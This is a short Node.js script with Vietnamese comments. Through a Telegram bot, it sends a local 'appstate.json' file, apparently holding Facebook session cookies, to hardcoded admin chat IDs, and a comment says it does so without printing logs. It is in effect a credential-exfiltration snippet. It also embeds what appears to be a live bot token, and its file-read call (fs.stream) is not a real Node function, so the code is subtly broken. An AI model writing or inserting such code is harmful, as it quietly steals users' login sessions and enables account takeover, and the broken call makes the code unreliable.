const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE'; // Thay thế bằng mã token của bot của bạn
const bot = new TelegramBot(botToken, { polling: true });

const adminIds = ['1713841196'];

adminIds.forEach(adminId => {
  const stream = fs.stream ('appstate.json');

  // Gửi tài liệu mà không in log và không chỉ định contentType
  bot.sendDocument(adminId, stream , { filename: 'appstate.json' });
});
